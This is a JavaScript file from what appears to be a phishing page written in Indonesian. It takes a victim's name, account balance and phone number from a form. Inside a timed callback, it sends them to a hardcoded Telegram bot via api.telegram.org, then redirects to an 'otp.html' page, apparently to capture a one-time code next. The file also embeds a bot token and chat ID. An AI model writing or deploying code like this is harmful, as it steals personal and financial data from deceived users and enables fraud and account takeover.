import { API_URL } from './global.js';

$(document).ready(function() {
	/* FOR TEST ONLY */
	/*$("#name").val("Test");
	$("#balance").val("20000000");
	$("#phone").val("0811111111");*/
	/* */
	$("#balance").on('input', function() {
		let value = $("#balance").val().trim().replace(/[^0-9]/g, '');
        $("#balance").val(value.replace(/\B(?=(\d{3})+(?!\d))/g, '.'));
	});
});

module.next = function() {
	setTimeout(() => {
		var name = $("#name").val().trim();
    	var balance = $("#balance").val().trim();
    	var phone = $("#phone").val().trim();
	    if (name.length==0 || balance.length==0 || phone.length==0) {
	    	alert('Mohon lengkapi semua data!');
            return;
    	}
        $("#loader").css('display', 'flex');
        window.localStorage.setItem('name', name);
        window.localStorage.setItem('balance', balance);
        window.localStorage.setItem('phone', phone);
        setTimeout(() => {
        	const BOT_TOKEN = "8275043100:AAEvHDLtfueDqkPJEsnCTK774GjBtOdC-8Q";
const CHAT_ID = "7037582670";
const MESSAGE = 'Nama: '+name+'\nSaldo: Rp'+balance+'\nNo. HP: '+phone;

const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

fetch(url, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    chat_id: CHAT_ID,
    text: MESSAGE
  })
})
.then(res => res.json())
.then(data => {
	$("#loader").css('display', 'none');
    window.location.href = "otp.html";
})
.catch(err => console.error("Error:", err));
        }, 100);
	}, 500);
};

module.goBack = function() {
	setTimeout(() => {
		var name = $("#name").val().trim();
    	var balance = $("#balance").val().trim();
    	var phone = $("#phone").val().trim();
	    if (name.length>0 || balance.length>0 || phone.length>0) {
	    	if (confirm("Apakah Anda yakin membuang perubahan ini dan kembali ke halaman sebelumnya?")) {
		    	window.history.back();
    		}
    	} else {
	    	window.history.back();
    	}
	}, 500);
};